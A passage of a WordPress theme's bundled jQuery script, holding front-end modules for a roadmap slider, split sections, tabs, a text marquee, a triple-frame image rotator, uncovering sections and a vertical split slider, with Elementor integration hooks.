						thisItemHeight = thisItem.find('.mkdf-roadmap-item-content-holder').outerHeight();

						if (itemsHeight < thisItemHeight){
							itemsHeight = thisItemHeight;
						}
					});

					roadmapItemsHolder.width(roadmapHolderWidth);
					thisRoadmap.css({'paddingTop': itemsHeight + 70, 'paddingBottom' : itemsHeight + 70});

					//if firstactive set change them accordingly
					if (typeof firstActive != 'undefined') {
						roadmapItems.removeClass('mkdf-roadmap-active-item');
						firstActive.addClass('mkdf-roadmap-active-item');
						for (var i = 0; i < visibleItems - 1; i++) {
							firstActive.nextAll().eq(i).addClass('mkdf-roadmap-active-item');
						}
						lastActive = roadmapItems.filter('.mkdf-roadmap-active-item').last();
					} else {
						roadmapItems.eq(visibleItems).prevAll().addClass('mkdf-roadmap-active-item');
						firstActive = roadmapItems.filter('.mkdf-roadmap-active-item').first();
						lastActive = roadmapItems.filter('.mkdf-roadmap-active-item').last();
					}
				};

				//movement for provided step (> 0 to the right, < 0 to the left)
				var moveRoadmap = function(step, timeout){
					var nextItem;
					//prevent multiple clicks while animating with moving  var
					if (!moving) {
						//grab item to be moved to
						if (step >= 1) {
							nextItem = lastActive.nextAll().eq(step - 1);
						} else {
							nextItem = firstActive.prevAll().eq(Math.abs(step) - 1);
						}
						if (nextItem.length) {
							moving = true;

							//adjust classes according to currently moved to item
							roadmapItems.removeClass('mkdf-roadmap-active-item');
							nextItem.addClass('mkdf-roadmap-active-item');
							if (step >= 1) {
								for (var i = 0; i < visibleItems - 1; i++) {
									nextItem.prevAll().eq(i).addClass('mkdf-roadmap-active-item');
								}
							} else {
								for (var i = 0; i < visibleItems - 1; i++) {
									nextItem.nextAll().eq(i).addClass('mkdf-roadmap-active-item');
								}
							}

							//set new first and last active items
							firstActive = roadmapItems.filter('.mkdf-roadmap-active-item').first();
							lastActive = roadmapItems.filter('.mkdf-roadmap-active-item').last();

							//move holder and set var moving to false
							translateCurrent -= step*itemsWidth;
							roadmapItemsHolder.css({'transform': 'translateX(' + translateCurrent + 'px)'});
							setTimeout(function () {
								moving = false;
							}, timeout);
						}
					}
				};

				//move holder to provided item
				var moveTo = function(item){
					var firstActiveIndex = firstActive.index(),
						lastActiveIndex = lastActive.index(),
						goToIndex = item.index(),
						moveStep = 0,
						middle;

					middle = (firstActiveIndex + lastActiveIndex) / 2;

					//if first or second item, go to third item
					//else if last or one before, go to third form the back
					//else go to the desired
					if ( goToIndex < Math.floor(visibleItems/2)) {
						moveStep = firstActiveIndex - 2;
					} else if (goToIndex > roadmapItems.length - 1 - Math.floor(visibleItems/2)) {
						moveStep = roadmapItems.length - 1 - lastActiveIndex;
					} else {
						moveStep = goToIndex - middle;
					}
					moveRoadmap(moveStep, 0);
				}

				//adjust translate so it wouldn't be stopped in the middle of items
				var resizeTranslateAdj = function(){
					var adjustment = firstActive.index()*itemsWidth;

					translateCurrent = -adjustment;
					roadmapItemsHolder.css({'transform': 'translateX(' + translateCurrent + 'px)'});
				}

				//inital set of widths and items
				setWidths();

				//move to reached item
				moveTo(itemReached);

				//bind movement for prev and next arrow
				nextArrow.on("click", function () {
					moveRoadmap(1, 200); //init movement to to right
				});
				prevArrow.on("click", function () {
					moveRoadmap(-1, 200); //init movement to to right
				});

				//adjustments on resize
				$(window).resize(function(){
					setWidths();
					resizeTranslateAdj();
				});

                $('.mkdf-roadmap-item-content-holder').css('opacity', 0);
                $('.mkdf-roadmap-item-above .mkdf-roadmap-item-content-holder').css('transform', 'translateY(20px)');
                $('.mkdf-roadmap-item-below .mkdf-roadmap-item-content-holder').css('transform', 'translateY(-20px)');
			});


			roadmap.appear(function () {
				$('.mkdf-roadmap-item-content-holder').each(function(i) {
					var fadeInTime = .2 + i/5;

					$(this).css({
						'opacity' : 1,
						'transform': 'translateY(0)',
                        'transition':'transform .25s ease-in-out '+ fadeInTime +'s, opacity .25s ease-in-out '+ fadeInTime +'s '
					})
				})
			})

        }


	}
	
})(jQuery);
(function($) {
    'use strict';

    var splitSection = {};
    mkdf.modules.splitSection = splitSection;

    splitSection.mkdfInitSSAppearFX = mkdfInitSSAppearFX;

    splitSection.mkdfOnDocumentReady = mkdfOnDocumentReady;

    $(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());

    /*
     All functions to be called on $(document).ready() should be in this function
     */
    function mkdfOnDocumentReady() {
        mkdfInitSSAppearFX();
    }

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorSSAppearFX();
    }

    /**
     * Elementor
     */
    function mkdfElementorSSAppearFX(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_split_section.default', function() {
                mkdfInitSSAppearFX();
                mkdf.modules.common.mkdfAppearingSection();
            } );
        });
    }


    function mkdfInitSSAppearFX() {
        var splitSection = $('.mkdf-ss-holder');

        if(splitSection.length){
            splitSection.each(function () {
                var thisSplitSection = $(this),
                    backgroundColorHolder = thisSplitSection.find('.mkdf-ss-background-holder'),
                    contentHolder = thisSplitSection.find('.mkdf-ss-content');

                thisSplitSection.appear(function() {
                    thisSplitSection.addClass('mkdf-appeared');
                    backgroundColorHolder.addClass('mkdf-appeared');
                    contentHolder.addClass('mkdf-appeared');
                },{accX: 0, accY:-400});
            })
        }
    }

})(jQuery);
(function($) {
	'use strict';
	
	var stackedImages = {};
	mkdf.modules.stackedImages = stackedImages;

	stackedImages.mkdfInitItemShowcase = mkdfInitStackedImages;


	stackedImages.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitStackedImages();
	}

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorStackedImages();
    }

    /**
     * Elementor
     */
    function mkdfElementorStackedImages(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_stacked_images.default', function() {
                mkdfInitStackedImages();
            } );
        });
    }

	/**
	 * Init item showcase shortcode
	 */
	function mkdfInitStackedImages() {
		var stackedImages = $('.mkdf-stacked-images-holder');

		if (stackedImages.length) {
			stackedImages.each(function(){
				var thisStackedImages = $(this),
					itemImage = thisStackedImages.find('.mkdf-si-images');

				//logic
				thisStackedImages.animate({opacity:1},200);

				setTimeout(function(){
					thisStackedImages.appear(function(){
						itemImage.addClass('mkdf-appeared');
					},{accX: 0, accY: mkdfGlobalVars.vars.mkdfElementAppearAmount});
				},100);
			});
		}
	}
	
})(jQuery);
(function($) {
	'use strict';
	
	var tabs = {};
	mkdf.modules.tabs = tabs;
	
	tabs.mkdfInitTabs = mkdfInitTabs;
	
	
	tabs.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/**
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitTabs();
	}

    /**
    All functions to be called on $(window).load() should be in this function
   */
    function mkdfOnWindowLoad() {
        mkdfElementorInitTabs();
    }

    /**
     * Elementor
     */
    function mkdfElementorInitTabs(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_tabs.default', function() {
                mkdfInitTabs();
            } );
        });
    }

	/*
	 **	Init tabs shortcode
	 */
	function mkdfInitTabs(){
		var tabs = $('.mkdf-tabs');
		
		if(tabs.length){
			tabs.each(function(){
				var thisTabs = $(this);
				
				thisTabs.children('.mkdf-tab-container').each(function(index){
					index = index + 1;
					var that = $(this),
						link = that.attr('id'),
						navItem = that.parent().find('.mkdf-tabs-nav li:nth-child('+index+') a'),
						navLink = navItem.attr('href');
					
					link = '#'+link;

					if(link.indexOf(navLink) > -1) {
						navItem.attr('href',link);
					}
				});
				
				thisTabs.tabs();

                $('.mkdf-tabs a.mkdf-external-link').off('click');
			});
		}
	}
	
})(jQuery);
(function ($) {
	'use strict';
	
	var teamCarousel = {};
	mkdf.modules.teamCarousel = teamCarousel;


    teamCarousel.mkdfOnWindowLoad = mkdfOnWindowLoad;
	
	$(window).on('load', mkdfOnWindowLoad());
	
	/**
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnWindowLoad() {
        mkdfElementorTeamCarousel();
	}


    /**
     * Elementor Team Carousel
     */
    function mkdfElementorTeamCarousel() {
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction('frontend/element_ready/mkdf_team_carousel.default', function () {
                mkdf.modules.common.mkdfOwlSlider();
            });
        });
    }
	
})(jQuery);
(function($) {
    'use strict';
    
    var textMarquee = {};
    mkdf.modules.textMarquee = textMarquee;
    
    textMarquee.mkdfInitTextMarquee = mkdfInitTextMarquee;
	textMarquee.mkdfTextMarqueeResize = mkdfTextMarqueeResize;
    
    textMarquee.mkdfOnDocumentReady = mkdfOnDocumentReady;
    
    $(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());

    /*
     All functions to be called on $(document).ready() should be in this function
     */
    function mkdfOnDocumentReady() {
        mkdfTextMarqueeResize();
        mkdfInitTextMarquee();
    }

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementoreTextMarquee();
    }

    /**
     * Elementor
     */
    function mkdfElementoreTextMarquee(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_text_marquee.default', function() {
                mkdfTextMarqueeResize();
                mkdfInitTextMarquee();
            } );
        });
    }

    /**
     * Init Text Marquee effect
     */
    function mkdfInitTextMarquee() {
        var textMarqueeShortcodes = $('.mkdf-text-marquee');

        if (textMarqueeShortcodes.length) {
            textMarqueeShortcodes.each(function(){
                var textMarqueeShortcode = $(this),
                    marqueeElements = textMarqueeShortcode.find('.mkdf-marquee-element'),
                    originalText = marqueeElements.filter('.mkdf-original-text'),
                    auxText = marqueeElements.filter('.mkdf-aux-text');

                var calcWidth = function(element) {
                    var width;

                    if (textMarqueeShortcode.outerWidth() > element.outerWidth()) {
                        width = textMarqueeShortcode.outerWidth();
                    } else {
                        width = element.outerWidth();
                    }

                    return width;
                };

                var marqueeEffect = function () {
	                mkdfRequestAnimationFrame();
	                
                    var delta = 1, //pixel movement
                        speedCoeff = 0.8, // below 1 to slow down, above 1 to speed up
                        marqueeWidth = calcWidth(originalText);
                    marqueeElements.css({'width':marqueeWidth}); // set the same width to both elements
                    auxText.css('left', marqueeWidth); //set to the right of the initial marquee element

                    //movement loop
                    marqueeElements.each(function(i){
                        var marqueeElement = $(this),
                            currentPos = 0;

                        var mkdfInfiniteScrollEffect = function() {
                            currentPos -= delta;

                            //move marquee element
                            if (marqueeElement.position().left <= -marqueeWidth) {
                                marqueeElement.css('left', parseInt(marqueeWidth - delta));
                                currentPos = 0;
                            }

                            marqueeElement.css('transform','translate3d('+speedCoeff*currentPos+'px,0,0)');
	
	                        requestNextAnimationFrame(mkdfInfiniteScrollEffect);

                            $(window).resize(function(){
                                marqueeWidth = calcWidth(originalText);
                                currentPos = 0;
                                originalText.css('left',0);
                                auxText.css('left', marqueeWidth); //set to the right of the inital marquee element
                            });
                        }; 
                            
                        mkdfInfiniteScrollEffect();
                    });
                };

                marqueeEffect();
            });
        }
    }
    
    /*
     * Request Animation Frame shim
     */
	function mkdfRequestAnimationFrame() {
		window.requestNextAnimationFrame =
			(function () {
				var originalWebkitRequestAnimationFrame = undefined,
					wrapper = undefined,
					callback = undefined,
					geckoVersion = 0,
					userAgent = navigator.userAgent,
					index = 0,
					self = this;
				
				// Workaround for Chrome 10 bug where Chrome
				// does not pass the time to the animation function
				
				if (window.webkitRequestAnimationFrame) {
					// Define the wrapper
					
					wrapper = function (time) {
						if (time === undefined) {
							time = +new Date();
						}
						
						self.callback(time);
					};
					
					// Make the switch
					
					originalWebkitRequestAnimationFrame = window.webkitRequestAnimationFrame;
					
					window.webkitRequestAnimationFrame = function (callback, element) {
						self.callback = callback;
						
						// Browser calls the wrapper and wrapper calls the callback
						originalWebkitRequestAnimationFrame(wrapper, element);
					};
				}
				
				// Workaround for Gecko 2.0, which has a bug in
				// mozRequestAnimationFrame() that restricts animations
				// to 30-40 fps.
				
				if (window.mozRequestAnimationFrame) {
					// Check the Gecko version. Gecko is used by browsers
					// other than Firefox. Gecko 2.0 corresponds to
					// Firefox 4.0.
					
					index = userAgent.indexOf('rv:');
					
					if (userAgent.indexOf('Gecko') !== -1) {
						geckoVersion = userAgent.substr(index + 3, 3);
						
						if (geckoVersion === '2.0') {
							// Forces the return statement to fall through
							// to the setTimeout() function.
							
							window.mozRequestAnimationFrame = undefined;
						}
					}
				}
				
				return window.requestAnimationFrame   ||
					window.webkitRequestAnimationFrame ||
					window.mozRequestAnimationFrame    ||
					window.oRequestAnimationFrame      ||
					window.msRequestAnimationFrame     ||
					
					function (callback, element) {
						var start,
							finish;
						
						window.setTimeout( function () {
							start = +new Date();
							callback(start);
							finish = +new Date();
							
							self.timeout = 1000 / 60 - (finish - start);
							
						}, self.timeout);
					};
				}
			)();
	}

	/*
	 **	Text Marquee resizing style
	 */
	function mkdfTextMarqueeResize() {
		var holder = $('.mkdf-text-marquee');

		if (holder.length) {
			holder.each(function () {
				var thisItem = $(this),
					itemClass = '',
					smallLaptopStyle = '',
					ipadLandscapeStyle = '',
					ipadPortraitStyle = '',
					mobileLandscapeStyle = '',
					style = '',
					responsiveStyle = '';

				if (typeof thisItem.data('item-class') !== 'undefined' && thisItem.data('item-class') !== false) {
					itemClass = thisItem.data('item-class');
				}

				if (typeof thisItem.data('font-size-1366') !== 'undefined' && thisItem.data('font-size-1366') !== false) {
					smallLaptopStyle += 'font-size: ' + thisItem.data('font-size-1366') + ' !important;';
				}
				if (typeof thisItem.data('font-size-1024') !== 'undefined' && thisItem.data('font-size-1024') !== false) {
					ipadLandscapeStyle += 'font-size: ' + thisItem.data('font-size-1024') + ' !important;';
				}
				if (typeof thisItem.data('font-size-768') !== 'undefined' && thisItem.data('font-size-768') !== false) {
					ipadPortraitStyle += 'font-size: ' + thisItem.data('font-size-768') + ' !important;';
				}
				if (typeof thisItem.data('font-size-680') !== 'undefined' && thisItem.data('font-size-680') !== false) {
					mobileLandscapeStyle += 'font-size: ' + thisItem.data('font-size-680') + ' !important;';
				}

				if (typeof thisItem.data('line-height-1366') !== 'undefined' && thisItem.data('line-height-1366') !== false) {
					smallLaptopStyle += 'line-height: ' + thisItem.data('line-height-1366') + ' !important;';
				}
				if (typeof thisItem.data('line-height-1024') !== 'undefined' && thisItem.data('line-height-1024') !== false) {
					ipadLandscapeStyle += 'line-height: ' + thisItem.data('line-height-1024') + ' !important;';
				}
				if (typeof thisItem.data('line-height-768') !== 'undefined' && thisItem.data('line-height-768') !== false) {
					ipadPortraitStyle += 'line-height: ' + thisItem.data('line-height-768') + ' !important;';
				}
				if (typeof thisItem.data('line-height-680') !== 'undefined' && thisItem.data('line-height-680') !== false) {
					mobileLandscapeStyle += 'line-height: ' + thisItem.data('line-height-680') + ' !important;';
				}

				if (smallLaptopStyle.length || ipadLandscapeStyle.length || ipadPortraitStyle.length || mobileLandscapeStyle.length) {

					if (smallLaptopStyle.length) {
						responsiveStyle += "@media only screen and (max-width: 1366px) {.mkdf-text-marquee." + itemClass + " { " + smallLaptopStyle + " } }";
					}
					if (ipadLandscapeStyle.length) {
						responsiveStyle += "@media only screen and (max-width: 1024px) {.mkdf-text-marquee." + itemClass + " { " + ipadLandscapeStyle + " } }";
					}
					if (ipadPortraitStyle.length) {
						responsiveStyle += "@media only screen and (max-width: 768px) {.mkdf-text-marquee." + itemClass + " { " + ipadPortraitStyle + " } }";
					}
					if (mobileLandscapeStyle.length) {
						responsiveStyle += "@media only screen and (max-width: 680px) {.mkdf-text-marquee." + itemClass + " { " + mobileLandscapeStyle + " } }";
					}
				}

				if (responsiveStyle.length) {
					style = '<style type="text/css">' + responsiveStyle + '</style>';
				}

				if (style.length) {
					$('head').append(style);
				}
			});
		}
	}

})(jQuery);
(function($) {
    'use strict';

    var tripleFrameImageHighlight = {};
    mkdf.modules.tripleFrameImageHighlight = tripleFrameImageHighlight;

    tripleFrameImageHighlight.mkdfOnDocumentReady = mkdfOnDocumentReady;
    tripleFrameImageHighlight.mkdfTripleFrameImageHighlight = mkdfTripleFrameImageHighlight;

    $(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());

    /*
     All functions to be called on $(document).ready() should be in this function
     */
    function mkdfOnDocumentReady() {
        mkdfTripleFrameImageHighlight();
    }

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementoreTripleFrameImageHighlight();
    }

    /**
     * Elementor
     */
    function mkdfElementoreTripleFrameImageHighlight(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_triple_frame_image_highlight.default', function() {
                mkdfTripleFrameImageHighlight();
            } );
        });
    }


    /**
     * Triple Frame Image Highlight
     */
    function mkdfTripleFrameImageHighlight() {
        var tfihShortcodes = $('.mkdf-triple-frame-image-highlight');

        if (tfihShortcodes.length) {
            var initClasses = function(c, l, r) {
                c.addClass('mkdf-c');
                l.addClass('mkdf-l');
                r.addClass('mkdf-r');
            }

            var resetIndexes = function(c, l, r) {
                c.css('z-index', 30);
                l.css('z-index', 20);
                r.css('z-index', 20);
            }

            var setTriggerSize = function(holder,inner) {
                holder.find('div[class*="trigger"]').width(Math.round(inner.position().left));
            }

            var setPositioning = function(holder, inner) {
                var left = holder.find('.mkdf-l'),
                    right = holder.find('.mkdf-r'),
                    centered = holder.find('.mkdf-c');

                var xOffset = inner.position().left;

                if (holder.parent().hasClass('mkdf-tfih-with-frame')) {
                    left.css({
                        'visibility': 'visible',
                        'transform-origin': '0% 50%',
                        'transform': 'matrix(0.8,0,0,0.8,-'+xOffset+',0)'
                    });
                    right.css({
                        'visibility': 'visible',
                        'transform-origin': '100% 50%',
                        'transform': 'matrix(0.8,0,0,0.8,'+xOffset+',0)'
                    });
                    centered.css({
                        'transform': 'matrix(1, 0, 0, 1, 0, 0)'
                    });
                } else {
                    left.css({
                        'visibility': 'visible',
                        'transform-origin': '0% 50%',
                        'transform': 'matrix(0.6,0,0,0.6,-'+xOffset+',0)'
                    });
                    right.css({
                        'visibility': 'visible',
                        'transform-origin': '100% 50%',
                        'transform': 'matrix(0.6,0,0,0.6,'+xOffset+',0)'
                    });
                    centered.css({
                        'transform': 'matrix(1, 0, 0, 1, 0, 0)'
                    });
                }
            }

            var rotateAnimation = function(holder, inner, direction) {
                holder.data('animating', true);

                if (direction == 'left') {
                    var toFront = holder.find('.mkdf-l'),
                        toBack = holder.find('.mkdf-c'),
                        toPrep = holder.find('.mkdf-r');

                    toPrep.removeClass('mkdf-r').addClass('mkdf-l');
                    toBack.removeClass('mkdf-c').addClass('mkdf-r');
                    toFront.removeClass('mkdf-l').addClass('mkdf-c');
                } else {
                    var toFront = holder.find('.mkdf-r'),
                        toBack = holder.find('.mkdf-c'),
                        toPrep = holder.find('.mkdf-l');

                    toPrep.removeClass('mkdf-l').addClass('mkdf-r');
                    toBack.removeClass('mkdf-c').addClass('mkdf-l');
                    toFront.removeClass('mkdf-r').addClass('mkdf-c');
                }

                toPrep.css({
                    'z-index': 15,
                    'transform-origin': '0% 50%',
                    'transition': 'transform .5s, transform-origin .5s'
                });
                toBack.css({
                    'z-index': 25,
                    'transform-origin': '100% 50%',
                    'transition': 'transform 1s cubic-bezier(0.19, 1, 0.22, 1) .2s, \
                                    transform-origin 1s cubic-bezier(0.19, 1, 0.22, 1) .2s, \
                                    box-shadow .3s'
                });
                toFront.css({
                    'z-index': 20,
                    'transform-origin': '50% 50%',
                    'transition': 'transform .75s cubic-bezier(0.86, 0, 0.07, 1) .5s, \
                                    transform-origin .75s cubic-bezier(0.86, 0, 0.07, 1) .5s, \
                                    box-shadow .3s'
                });

                holder.find('a').css('pointer-events', 'none');
                setTimeout(function() {
                    holder.find('a').css('pointer-events', 'auto');
                    resetIndexes(toFront, toPrep, toBack);
                }, 500);

                toFront.one(mkdf.transitionEnd, function() {
                    holder.data('animating', false);
                    clearInterval(holder.data('autoplay'));
                    holder.data('autoplay', setInterval(function() {
                        navigate(holder, inner);
                    }, 3000));
                })
            }

            var navigate = function(holder, inner, event) {
                var direction,
                    linkActive = false;

                if (typeof event !== 'undefined') {
                    switch(event.target.className) {
                        case 'mkdf-tfih-left-trigger':
                            direction = 'left';
                            break;
                        case 'mkdf-tfih-right-trigger':
                            direction = 'right';
                            break;
                        case 'mkdf-tfih-link':
                            linkActive = true;
                            holder.data('animating', false);
                            clearInterval(holder.data('autoplay'));
                            break;
                    }
                } else {
                    direction = 'right';
                }

                if (!linkActive) {
                    rotateAnimation(holder, inner, direction)
                    setPositioning(holder, inner);
                }
            }

            tfihShortcodes.each(function() {
                var holder = $(this),
                    inner = holder.find('.mkdf-tfih-inner'),
                    centeredH = holder.find('.mkdf-tfih-centered-image-holder'),
                    leftH = holder.find('.mkdf-tfih-left-image-holder'),
                    rightH = holder.find('.mkdf-tfih-right-image-holder');

                //state
                holder
                    .data('animating', false)
                    .data('autoplay', false);

                initClasses(centeredH, leftH, rightH);
                resetIndexes(centeredH, leftH, rightH);
                setTriggerSize(holder, inner);

                holder.waitForImages(function() {
                    holder.appear(function() {
                        holder.css('visibility', 'visible');
                        setPositioning(holder, inner);
                        holder.data('autoplay', setInterval(function() {
                            navigate(holder, inner);
                        }, 3000));
                    }, {accX: 0, accY: mkdfGlobalVars.vars.mkdfElementAppearAmount});
                });

                holder.on('click', function(event) {
                    if (!holder.data('animating')) {
                        clearInterval(holder.data('autoplay'));
                        navigate(holder, inner, event);
                    }
                });

                if (holder.parent().hasClass('mkdf-tfih-with-nav')) {
                    var left = holder.parent().find('.mkdf-tfih-left'),
                        right = holder.parent().find('.mkdf-tfih-right');

                    left.on('click', function() {
                        if (!holder.data('animating')) {
                            rotateAnimation(holder, inner, 'left')
                            setPositioning(holder, inner);
                        }
                    });

                    right.on('click', function() {
                        if (!holder.data('animating')) {
                            rotateAnimation(holder, inner, 'right')
                            setPositioning(holder, inner);
                        }
                    });
                }

                $(window).on('resize', function() {
                    setPositioning(holder, inner);
                    setTriggerSize(holder, inner);
                    inner.find('>div').css('transition', 'none');
                })
            });
        }
    }
})(jQuery);

(function($) {
    'use strict';

    var uncoveringSections = {};
    mkdf.modules.uncoveringSections = uncoveringSections;

    uncoveringSections.mkdfInitUncoveringSections = mkdfInitUncoveringSections;


    uncoveringSections.mkdfOnDocumentReady = mkdfOnDocumentReady;

    $(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());

    /**
     All functions to be called on $(document).ready() should be in this function
     */
    function mkdfOnDocumentReady() {
        mkdfInitUncoveringSections();
    }

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorUncoveringSections();
    }

    /**
     * Elementor
     */
    function mkdfElementorUncoveringSections(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_uncovering_sections.default', function() {
                mkdfInitUncoveringSections();
            } );
        });
    }

    /*
     **	Init full screen sections shortcode
     */
    function mkdfInitUncoveringSections(){
        var uncoveringSections = $('.mkdf-uncovering-sections');

        if(uncoveringSections.length){
            uncoveringSections.each(function() {
                var thisUS = $(this),
                    thisCurtain = uncoveringSections.find('.curtains'),
                    curtainItems = thisCurtain.find('.mkdf-uss-item'),
                    curtainShadow = uncoveringSections.find('.mkdf-fss-shadow');
                var body = mkdf.body;
                var defaultHeaderStyle = '';
                if (body.hasClass('mkdf-light-header')) {
                    defaultHeaderStyle = 'light';
                } else if (body.hasClass('mkdf-dark-header')) {
                    defaultHeaderStyle = 'dark';
                }

                body.addClass('mkdf-uncovering-section-on-page');
                if(mkdfPerPageVars.vars.mkdfHeaderVerticalWidth > 0 && mkdf.windowWidth > 1024) {
                    curtainItems.css({
                        left : mkdfPerPageVars.vars.mkdfHeaderVerticalWidth,
                        width: 'calc(100% - ' + mkdfPerPageVars.vars.mkdfHeaderVerticalWidth + 'px)'
                    });

                    curtainShadow.css({
                        left : mkdfPerPageVars.vars.mkdfHeaderVerticalWidth,
                        width: 'calc(100% - ' + mkdfPerPageVars.vars.mkdfHeaderVerticalWidth + 'px)'
                    });
                }

                thisCurtain.curtain({
                    scrollSpeed: 400,
                    nextSlide: function() { checkFullScreenSectionsItemForHeaderStyle(thisCurtain, defaultHeaderStyle); },
                    prevSlide: function() { checkFullScreenSectionsItemForHeaderStyle(thisCurtain, defaultHeaderStyle);}
                });

                checkFullScreenSectionsItemForHeaderStyle(thisCurtain, defaultHeaderStyle);
                setResposniveData(thisCurtain);

                thisUS.addClass('mkdf-loaded');
            });
        }
    }

    function checkFullScreenSectionsItemForHeaderStyle(thisUncoveringSections, default_header_style) {
        var section_header_style = thisUncoveringSections.find('.current').data('header-style');
        if (section_header_style !== undefined && section_header_style !== '') {
            mkdf.body.removeClass('mkdf-light-header mkdf-dark-header').addClass('mkdf-' + section_header_style + '-header');
        } else if (default_header_style !== '') {
            mkdf.body.removeClass('mkdf-light-header mkdf-dark-header').addClass('mkdf-' + default_header_style + '-header');
        } else {
            mkdf.body.removeClass('mkdf-light-header mkdf-dark-header');
        }
    }

    function setResposniveData(thisUncoveringSections) {
        var uncoveringSections = thisUncoveringSections.find('.mkdf-uss-item'),
            responsiveStyle = '',
            style = '';

        uncoveringSections.each(function(){
            var thisSection = $(this),
                thisSectionImage = thisSection.find('.mkdf-uss-image-holder'),
                itemClass = '',
                imageLaptop = '',
                imageTablet = '',
                imagePortraitTablet = '',
                imageMobile = '';

            if (typeof thisSection.data('item-class') !== 'undefined' && thisSection.data('item-class') !== false) {
                itemClass = thisSection.data('item-class');
            }

            if (typeof thisSectionImage.data('laptop-image') !== 'undefined' && thisSectionImage.data('laptop-image') !== false) {
                imageLaptop = thisSectionImage.data('laptop-image');
            }
            if (typeof thisSectionImage.data('tablet-image') !== 'undefined' && thisSectionImage.data('tablet-image') !== false) {
                imageTablet = thisSectionImage.data('tablet-image');
            }
            if (typeof thisSectionImage.data('tablet-portrait-image') !== 'undefined' && thisSectionImage.data('tablet-portrait-image') !== false) {
                imagePortraitTablet = thisSectionImage.data('tablet-portrait-image');
            }
            if (typeof thisSectionImage.data('mobile-image') !== 'undefined' && thisSectionImage.data('mobile-image') !== false) {
                imageMobile = thisSectionImage.data('mobile-image');
            }


            if (imageLaptop.length || imageTablet.length || imagePortraitTablet.length || imageMobile.length) {

                if (imageLaptop.length) {
                    responsiveStyle += "@media only screen and (max-width: 1366px) {.mkdf-uss-item." + itemClass + " .mkdf-uss-image-holder { background-image: url(" + imageLaptop + ") !important; } }";
                }
                if (imageTablet.length) {
                    responsiveStyle += "@media only screen and (max-width: 1024px) {.mkdf-uss-item." + itemClass + " .mkdf-uss-image-holder { background-image: url( " + imageTablet + ") !important; } }";
                }
                if (imagePortraitTablet.length) {
                    responsiveStyle += "@media only screen and (max-width: 800px) {.mkdf-uss-item." + itemClass + " .mkdf-uss-image-holder { background-image: url( " + imagePortraitTablet + ") !important; } }";
                }
                if (imageMobile.length) {
                    responsiveStyle += "@media only screen and (max-width: 680px) {.mkdf-uss-item." + itemClass + " .mkdf-uss-image-holder { background-image: url( " + imageMobile + ") !important; } }";
                }
            }
        });

        if (responsiveStyle.length) {
            style = '<style type="text/css">' + responsiveStyle + '</style>';
        }

        if (style.length) {
            $('head').append(style);
        }
    }

})(jQuery);
(function($) {
	'use strict';
	
	var verticalSplitSlider = {};
	mkdf.modules.verticalSplitSlider = verticalSplitSlider;
	
	verticalSplitSlider.mkdfInitVerticalSplitSlider = mkdfInitVerticalSplitSlider;
	
	
	verticalSplitSlider.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/**
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitVerticalSplitSlider();
	}

	/**
	 All functions to be called on $(window).load() should be in this function
	 */
	function mkdfOnWindowLoad() {
		mkdfElementorVerticalSplitSlider();
	}

	/**
	 * Elementor
	 */
	function mkdfElementorVerticalSplitSlider(){
		$(window).on('elementor/frontend/init', function () {
			elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_vertical_split_slider.default', function() {
				mkdfInitVerticalSplitSlider();
			} );
		});
	}

	/**
	 **	Vertical Split Slider
	 */
	function mkdfInitVerticalSplitSlider() {
		var slider = $('.mkdf-vertical-split-slider'),
			progressBarFlag = true;
		
		if (slider.length) {
			if (mkdf.body.hasClass('mkdf-vss-initialized')) {
				mkdf.body.removeClass('mkdf-vss-initialized');
				$.fn.multiscroll.destroy();
			}
			
			slider.height(mkdf.windowHeight).animate({opacity: 1}, 300);
			
			var defaultHeaderStyle = '';
			if (mkdf.body.hasClass('mkdf-light-header')) {
				defaultHeaderStyle = 'light';
			} else if (mkdf.body.hasClass('mkdf-dark-header')) {
				defaultHeaderStyle = 'dark';
			}
			
			slider.multiscroll({
				scrollingSpeed: 700,
				easing: 'easeInOutQuart',
				navigation: true,
				useAnchorsOnLoad: false,
				sectionSelector: '.mkdf-vss-ms-section',
				leftSelector: '.mkdf-vss-ms-left',
				rightSelector: '.mkdf-vss-ms-right',
				afterRender: function () {
					mkdfCheckVerticalSplitSectionsForHeaderStyle($('.mkdf-vss-ms-left .mkdf-vss-ms-section:first-child').data('header-style'), defaultHeaderStyle);
